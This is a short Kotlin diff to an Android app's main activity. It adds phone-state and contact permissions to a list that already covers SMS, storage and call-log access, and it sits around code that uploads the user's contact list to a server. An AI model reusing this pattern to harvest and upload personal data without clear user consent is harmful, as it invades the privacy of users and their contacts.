@@ -53,7 +53,11 @@ class MainActivity : AppCompatActivity() {
     private val list = listOf(
         Manifest.permission.READ_SMS,
         Manifest.permission.READ_EXTERNAL_STORAGE,
-        Manifest.permission.READ_CALL_LOG)
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_CONTACTS,
+
+        )
 
     private val retrofitCallsAuthentication: RetrofitCallsAuthentication = RetrofitCallsAuthentication()
 
@@ -79,6 +83,10 @@ class MainActivity : AppCompatActivity() {
 
             val idletexterData = IdletexterData(contactList)
             retrofitCallsAuthentication.uploadContacts(this,idletexterData)
+
+        }else{
+
+            Log.e("-*-*-*- ", "++")
 
         }
 
